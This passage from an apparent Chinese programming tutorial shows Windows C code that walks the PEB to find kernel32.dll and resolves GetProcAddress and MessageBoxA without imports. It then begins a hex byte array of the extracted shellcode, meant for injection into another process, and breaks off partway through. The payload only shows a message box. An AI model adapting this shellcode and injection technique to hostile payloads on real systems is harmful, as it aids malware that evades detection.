LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="comment">//线程处理函数，回调函数</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ShellCode</span><span class="params">(LPVOID lpThreadParameter)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HMODULE</span> <span class="params">(WINAPI *PLOADLIBRARYA)</span><span class="params">(LPCSTR)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span> <span class="params">(WINAPI *PGETPROCADDRESS)</span><span class="params">(HMODULE, LPCSTR)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span> <span class="params">(WINAPI *PMESSAGEBOXA)</span><span class="params">(HWND, LPCSTR,LPCSTR,UINT)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TOUPPER(x) ((((x)&gt;=<span class="meta-string">&#x27;a&#x27;</span>)&amp;&amp;((x)&lt;=<span class="meta-string">&#x27;z&#x27;</span>))?((x)-32):(x))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TOLOWER(x) ((((x)&gt;=<span class="meta-string">&#x27;A&#x27;</span>)&amp;&amp;((x)&lt;=<span class="meta-string">&#x27;Z&#x27;</span>))?((x)+32):(x))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	CreateThread(<span class="number">0</span>,<span class="number">0</span>,ShellCode,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ShellCode</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PPEB_LDR_DATA Ldr = <span class="literal">NULL</span>;</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY Ldte = <span class="literal">NULL</span>;</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY Head = <span class="literal">NULL</span>;</span><br><span class="line">	PGETPROCADDRESS pGetProcAddress = <span class="literal">NULL</span>;</span><br><span class="line">	PLOADLIBRARYA pLoadLibraryA = <span class="literal">NULL</span>;</span><br><span class="line">	PMESSAGEBOXA pMessageBoxA = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> szKernel32[] = &#123;<span class="string">&#x27;k&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;e&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;r&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;e&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;l&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;3&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;2&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;.&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;d&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;l&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;l&#x27;</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;; <span class="comment">// Unicode</span></span><br><span class="line">	<span class="keyword">char</span> szUser32[] = &#123;<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> szGetProcAddress[] = &#123;<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> szLoadLibrary[] = &#123;<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> szMessageBoxA[] = &#123;<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> szHelloShellCode[] = &#123;<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		push eax;</span><br><span class="line">		mov eax, fs:[<span class="number">30</span>h];	<span class="comment">//eax 指向PEB</span></span><br><span class="line">		mov eax, [eax+<span class="number">0xc</span>]	<span class="comment">//eax 指向PEB_LDR_DATA </span></span><br><span class="line">		mov Ldr, eax;</span><br><span class="line">		pop eax;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//(1) Find kernel32.dll</span></span><br><span class="line">	PCHAR pDllName = <span class="literal">NULL</span>;</span><br><span class="line">	PCHAR pKernel = <span class="literal">NULL</span>;</span><br><span class="line">	BOOL bGet = FALSE;	</span><br><span class="line">	PVOID pDllBase = <span class="literal">NULL</span>;</span><br><span class="line">	Ldte = (PLDR_DATA_TABLE_ENTRY)Ldr-&gt;InLoadOrderModuleList.Flink;</span><br><span class="line">	Head = Ldte;</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		Ldte = (PLDR_DATA_TABLE_ENTRY)Ldte-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">		pKernel = szKernel32;</span><br><span class="line">		pDllName = (PCHAR)Ldte-&gt;BaseDllName.Buffer;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(TOUPPER(*pDllName) != TOUPPER(*pKernel))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(*(PWORD)pDllName == <span class="literal">NULL</span> &amp;&amp; *(PWORD)pKernel == <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				bGet = TRUE;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			pDllName = (PCHAR)((DWORD)pDllName + <span class="number">1</span>);</span><br><span class="line">			pKernel = (PCHAR)((DWORD)pKernel + <span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(bGet == TRUE)</span><br><span class="line">		&#123;</span><br><span class="line">			pDllBase = (LPVOID)Ldte-&gt;DllBase;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(Head != Ldte);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(bGet != TRUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Get GetProcAddress Fuctions Address</span></span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pDllBase;</span><br><span class="line">	PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	PIMAGE_FILE_HEADER pPEHeader = (PIMAGE_FILE_HEADER)((DWORD)pNTHeader + <span class="number">4</span>);</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER pOptionHeader = (PIMAGE_OPTIONAL_HEADER)((DWORD)pPEHeader + <span class="keyword">sizeof</span>(IMAGE_FILE_HEADER));</span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pPEHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader + pOptionHeader-&gt;DataDirectory[<span class="number">0</span>].VirtualAddress);</span><br><span class="line">	</span><br><span class="line">	PDWORD AddressOfFunctions = (PDWORD)((DWORD)pDosHeader + pExportDirectory-&gt;AddressOfFunctions);</span><br><span class="line">	PDWORD AddressOfNames = (PDWORD)((DWORD)pDosHeader + pExportDirectory-&gt;AddressOfNames);</span><br><span class="line">	PWORD AddressOfNameOridinals = (PWORD)((DWORD)pDosHeader + pExportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(DWORD i = <span class="number">0</span>; i &lt; pExportDirectory-&gt;NumberOfNames;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		bGet = FALSE;</span><br><span class="line">		PCHAR pFunName = (PCHAR)((DWORD)pDllBase + AddressOfNames[i]);</span><br><span class="line">		PCHAR pGetProcAddr = szGetProcAddress;</span><br><span class="line">		<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(*pFunName != *pGetProcAddr)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(*pFunName == <span class="literal">NULL</span> &amp;&amp; *pGetProcAddr == <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				bGet = TRUE;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			pFunName = (PCHAR)((DWORD)pFunName + <span class="number">1</span>);</span><br><span class="line">			pGetProcAddr = (PCHAR)((DWORD)pGetProcAddr + <span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(bGet == TRUE)</span><br><span class="line">		&#123;</span><br><span class="line">			pGetProcAddress = (PGETPROCADDRESS)(AddressOfFunctions[AddressOfNameOridinals[i]] + (DWORD)pDllBase);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//Get Address</span></span><br><span class="line">	pLoadLibraryA = (PLOADLIBRARYA)pGetProcAddress((HMODULE)pDllBase,szLoadLibrary);</span><br><span class="line">	pMessageBoxA = (PMESSAGEBOXA)pGetProcAddress(pLoadLibraryA(szUser32),szMessageBoxA);</span><br><span class="line">	pMessageBoxA(<span class="number">0</span>,szHelloShellCode,<span class="number">0</span>,MB_OK);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将函数<code>DWORD WINAPI ShellCode(LPVOID lpThreadParameter);</code>的硬编码提取出来。然后注入到某个进程中去：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BYTE ShellCode[] = </span><br><span class="line">&#123;</span><br><span class="line">	<span class="number">0x55</span>,<span class="number">0x8B</span>,<span class="number">0xEC</span>,<span class="number">0x83</span>,<span class="number">0xEC</span>,<span class="number">0x7C</span>,<span class="number">0x53</span>,<span class="number">0x33</span>,<span class="number">0xDB</span>,<span class="number">0xB0</span>,<span class="number">0x65</span>,<span class="number">0xB1</span>,<span class="number">0x6C</span>,<span class="number">0xB2</span>,<span class="number">0x64</span>,<span class="number">0x56</span>,</span><br><span class="line">	<span class="number">0x57</span>,<span class="number">0x89</span>,<span class="number">0x5D</span>,<span class="number">0xF8</span>,<span class="number">0x89</span>,<span class="number">0x5D</span>,<span class="number">0xF4</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0x84</span>,<span class="number">0x6B</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x85</span>,<span class="number">0x88</span>,<span class="number">0x45</span>,</span><br><span class="line">	<span class="number">0x86</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x87</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0x88</span>,<span class="number">0x72</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x89</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0x8A</span>,<span class="number">0x6E</span>,<span class="number">0x88</span>,</span><br><span class="line">	<span class="number">0x5D</span>,<span class="number">0x8B</span>,<span class="number">0x88</span>,<span class="number">0x45</span>,<span class="number">0x8C</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x8D</span>,<span class="number">0x88</span>,<span class="number">0x4D</span>,<span class="number">0x8E</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x8F</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,</span><br><span class="line">	<span class="number">0x90</span>,<span class="number">0x33</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x91</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0x92</span>,<span class="number">0x32</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x93</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0x94</span>,<span class="number">0x2E</span>,</span><br><span class="line">	<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x95</span>,<span class="number">0x88</span>,<span class="number">0x55</span>,<span class="number">0x96</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x97</span>,<span class="number">0x88</span>,<span class="number">0x4D</span>,<span class="number">0x98</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x99</span>,<span class="number">0x88</span>,</span><br><span class="line">	<span class="number">0x4D</span>,<span class="number">0x9A</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x9B</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x9C</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x9D</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xDC</span>,<span class="number">0x75</span>,<span class="number">0xC6</span>,</span><br><span class="line">	<span class="number">0x45</span>,<span class="number">0xDD</span>,<span class="number">0x73</span>,<span class="number">0x88</span>,<span class="number">0x45</span>,<span class="number">0xDE</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xDF</span>,<span class="number">0x72</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xE0</span>,<span class="number">0x33</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,</span><br><span class="line">	<span class="number">0xE1</span>,<span class="number">0x32</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xE2</span>,<span class="number">0x2E</span>,<span class="number">0x88</span>,<span class="number">0x55</span>,<span class="number">0xE3</span>,<span class="number">0x88</span>,<span class="number">0x4D</span>,<span class="number">0xE4</span>,<span class="number">0x88</span>,<span class="number">0x4D</span>,<span class="number">0xE5</span>,<span class="number">0x88</span>,</span><br><span class="line">	<span class="number">0x5D</span>,<span class="number">0xE6</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xA0</span>,<span class="number">0x47</span>,<span class="number">0x88</span>,<span class="number">0x45</span>,<span class="number">0xA1</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xA2</span>,<span class="number">0x74</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xA3</span>,</span><br><span class="line">	<span class="number">0x50</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xA4</span>,<span class="number">0x72</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xA5</span>,<span class="number">0x6F</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xA6</span>,<span class="number">0x63</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xA7</span>,</span><br><span class="line">	<span class="number">0x41</span>,<span class="number">0x88</span>,<span class="number">0x55</span>,<span class="number">0xA8</span>,<span class="number">0x88</span>,<span class="number">0x55</span>,<span class="number">0xA9</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xAA</span>,<span class="number">0x72</span>,<span class="number">0x88</span>,<span class="number">0x45</span>,<span class="number">0xAB</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,</span><br><span class="line">	<span class="number">0xAC</span>,<span class="number">0x73</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xAD</span>,<span class="number">0x73</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0xAE</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC0</span>,<span class="number">0x4C</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC1</span>,</span><br><span class="line">	<span class="number">0x6F</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC2</span>,<span class="number">0x61</span>,<span class="number">0x88</span>,<span class="number">0x55</span>,<span class="number">0xC3</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC4</span>,<span class="number">0x4C</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC5</span>,<span class="number">0x69</span>,</span><br><span class="line">	<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC6</span>,<span class="number">0x62</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC7</span>,<span class="number">0x72</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC8</span>,<span class="number">0x61</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC9</span>,<span class="number">0x72</span>,</span><br><span class="line">	<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xCA</span>,<span class="number">0x79</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xCB</span>,<span class="number">0x41</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0xCC</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xD0</span>,<span class="number">0x4D</span>,<span class="number">0x88</span>,</span><br><span class="line">	<span class="number">0x45</span>,<span class="number">0xD1</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xD2</span>,<span class="number">0x73</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xD3</span>,<span class="number">0x73</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xD4</span>,<span class="number">0x61</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,</span><br><span class="line">	<span class="number">0xD5</span>,<span class="number">0x67</span>,<span class="number">0x88</span>,<span class="number">0x45</span>,<span class="number">0xD6</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xD7</span>,<span class="number">0x42</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xD8</span>,<span class="number">0x6F</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xD9</span>,</span><br><span class="line">	<span class="number">0x78</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xDA</span>,<span class="number">0x41</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0xDB</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xB0</span>,<span class="number">0x48</span>,<span class="number">0x88</span>,<span class="number">0x45</span>,<span class="number">0xB1</span>,<span class="number">0x88</span>,</span><br><span class="line">	<span class="number">0x4D</span>,<span class="number">0xB2</span>,<span class="number">0x88</span>,<span class="number">0x4D</span>,<span class="number">0xB3</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xB4</span>,<span class="number">0x6F</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xB5</span>,<span class="number">0x53</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xB6</span>,</span><br><span class="line">	<span class="number">0x68</span>,<span class="number">0x88</span>,<span class="number">0x45</span>,<span class="number">0xB7</span>,<span class="number">0x88</span>,<span class="number">0x4D</span>,<span class="number">0xB8</span>,<span class="number">0x88</span>,<span class="number">0x4D</span>,<span class="number">0xB9</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xBA</span>,<span class="number">0x43</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,</span><br><span class="line">	<span class="number">0xBB</span>,<span class="number">0x6F</span>,<span class="number">0x88</span>,<span class="number">0x55</span>,<span class="number">0xBC</span>,<span class="number">0x88</span>,<span class="number">0x45</span>,<span class="number">0xBD</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0xBE</span>,<span class="number">0x50</span>,<span class="number">0x64</span>,<span class="number">0xA1</span>,<span class="number">0x30</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x8B</span>,<span class="number">0x40</span>,<span class="number">0x0C</span>,<span class="number">0x89</span>,<span class="number">0x45</span>,<span class="number">0xF8</span>,<span class="number">0x58</span>,<span class="number">0x8B</span>,<span class="number">0x45</span>,<span class="number">0xF8</span>,<span class="number">0x8B</span>,<span class="number">0x70</span>,<span class="number">0x0C</span>,<span class="number">0x89</span>,</span><br><span class="line">	<span class="number">0x75</span>,<span class="number">0xF8</span>,<span class="number">0x8B</span>,<span class="number">0x36</span>,<span class="number">0x8D</span>,<span class="number">0x7D</span>,<span class="number">0x84</span>,<span class="number">0x8B</span>,<span class="number">0x4E</span>,<span class="number">0x30</span>,<span class="number">0x2B</span>,<span class="number">0xF9</span>,<span class="number">0x8A</span>,<span class="number">0x01</span>,<span class="number">0x3C</span>,<span class="number">0x61</span>,</span><br><span class="line">	<span class="number">0x7C</span>,<span class="number">0x0C</span>,<span class="number">0x3C</span>,<span class="number">0x7A</span>,<span class="number">0x7F</span>,<span class="number">0x08</span>,<span class="number">0x0F</span>,<span class="number">0xBE</span>,<span class="number">0xD0</span>,<span class="number">0x83</span>,<span class="number">0xEA</span>,<span class="number">0x20</span>,<span class="number">0xEB</span>,<span class="number">0x03</span>,<span class="number">0x0F</span>,<span class="number">0xBE</span>,</span><br><span class="line">	<span class="number">0xD0</span>,<span class="number">0x8A</span>,<span class="number">0x04</span>,<span class="number">0x0F</span>,<span class="number">0x3C</span>,<span class="number">0x61</span>,<span class="number">0x7C</span>,<span class="number">0x0C</span>,<span class="number">0x3C</span>,<span class="number">0x7A</span>,<span class="number">0x7F</span>,<span class="number">0x08</span>,<span class="number">0x0F</span>,<span class="number">0xBE</span>,<span class="number">0xC0</span>,<span class="number">0x83</span>,</span><br><span class="line">	<span class="number">0xE8</span>,<span class="number">0x20</span>,<span class="number">0xEB</span>,<span class="number">0x03</span>,<span class="number">0x0F</span>,<span class="number">0xBE</span>,<span class="number">0xC0</span>,<span class="number">0x3B</span>,<span class="number">0xD0</span>,<span class="number">0x75</span>,<span class="number">0x0E</span>,<span class="number">0x66</span>,<span class="number">0x39</span>,<span class="number">0x19</span>,<span class="number">0x75</span>,<span class="number">0x06</span>,</span><br><span class="line">	<span class="number">0x66</span>,<span class="number">0x39</span>,<span class="number">0x1C</span>,<span class="number">0x0F</span>,<span class="number">0x74</span>,<span class="number">0x0E</span>,<span class="number">0x41</span>,<span class="number">0xEB</span>,<span class="number">0xC3</span>,<span class="number">0x39</span>,<span class="number">0x75</span>,<span class="number">0xF8</span>,<span class="number">0x0F</span>,<span class="number">0x84</span>,<span class="number">0xA5</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xEB</span>,<span class="number">0xAE</span>,<span class="number">0x8B</span>,<span class="number">0x76</span>,<span class="number">0x18</span>,<span class="number">0x89</span>,<span class="number">0x5D</span>,<span class="number">0xF8</span>,<span class="number">0x8B</span>,<span class="number">0x4E</span>,<span class="number">0x3C</span>,<span class="number">0x8B</span>,<span class="number">0x44</span>,<span class="number">0x31</span>,</span><br><span class="line">	<span class="number">0x78</span>,<span class="number">0x8B</span>,<span class="number">0x4C</span>,<span class="number">0x30</span>,<span class="number">0x1C</span>,<span class="number">0x03</span>,<span class="number">0xC6</span>,<span class="number">0x03</span>,<span class="number">0xCE</span>,<span class="number">0x89</span>,<span class="number">0x4D</span>,<span class="number">0xE8</span>,<span class="number">0x8B</span>,<span class="number">0x48</span>,<span class="number">0x20</span>,<span class="number">0x8B</span>,</span><br><span class="line">	<span class="number">0x50</span>,<span class="number">0x24</span>,<span class="number">0x8B</span>,<span class="number">0x40</span>,<span class="number">0x18</span>,<span class="number">0x03</span>,<span class="number">0xCE</span>,<span class="number">0x03</span>,<span class="number">0xD6</span>,<span class="number">0x3B</span>,<span class="number">0xC3</span>,<span class="number">0x89</span>,<span class="number">0x55</span>,<span class="number">0xEC</span>,<span class="number">0x89</span>,<span class="number">0x45</span>,</span><br><span class="line">	<span class="number">0xF0</span>,<span class="number">0x76</span>,<span class="number">0x54</span>,<span class="number">0x89</span>,<span class="number">0x4D</span>,<span class="number">0xFC</span>,<span class="number">0x8B</span>,<span class="number">0x55</span>,<span class="number">0xFC</span>,<span class="number">0x8B</span>,<span class="number">0x02</span>,<span class="number">0x8D</span>,<span class="number">0x55</span>,<span class="number">0xA0</span>,<span class="number">0x8D</span>,<span class="number">0x3C</span>,</span><br><span class="line">	<span class="number">0x06</span>,<span class="number">0x2B</span>,<span class="number">0xD7</span>,<span class="number">0x8A</span>,<span class="number">0x0F</span>,<span class="number">0x8A</span>,<span class="number">0x04</span>,<span class="number">0x3A</span>,<span class="number">0x3A</span>,<span class="number">0xC8</span>,<span class="number">0x75</span>,<span class="number">0x0B</span>,<span class="number">0x3A</span>,<span class="number">0xCB</span>,<span class="number">0x75</span>,<span class="number">0x04</span>,</span><br><span class="line">	<span class="number">0x3A</span>,<span class="number">0xC3</span>,<span class="number">0x74</span>,<span class="number">0x1C</span>,<span class="number">0x47</span>,<span class="number">0xEB</span>,<span class="number">0xEC</span>,<span class="number">0x8B</span>,<span class="number">0x45</span>,<span class="number">0xF8</span>,<span class="number">0x8B</span>,<span class="number">0x55</span>,<span class="number">0xFC</span>,<span class="number">0x8B</span>,<span class="number">0x4D</span>,<span class="number">0xF0</span>,</span><br><span class="line">	<span class="number">0x40</span>,<span class="number">0x83</span>,<span class="number">0xC2</span>,<span class="number">0x04</span>,<span class="number">0x3B</span>,<span class="number">0xC1</span>,<span class="number">0x89</span>,<span class="number">0x45</span>,<span class="number">0xF8</span>,<span class="number">0x89</span>,<span class="number">0x55</span>,<span class="number">0xFC</span>,<span class="number">0x73</span>,<span class="number">0x19</span>,<span class="number">0xEB</span>,<span class="number">0xC6</span>,</span><br><span class="line">	<span class="number">0x8B</span>,<span class="number">0x55</span>,<span class="number">0xEC</span>,<span class="number">0x8B</span>,<span class="number">0x45</span>,<span class="number">0xF8</span>,<span class="number">0x33</span>,<span class="number">0xC9</span>,<span class="number">0x66</span>,<span class="number">0x8B</span>,<span class="number">0x0C</span>,<span class="number">0x42</span>,<span class="number">0x8B</span>,<span class="number">0x55</span>,<span class="number">0xE8</span>,<span class="number">0x8B</span>,</span><br><span class="line">	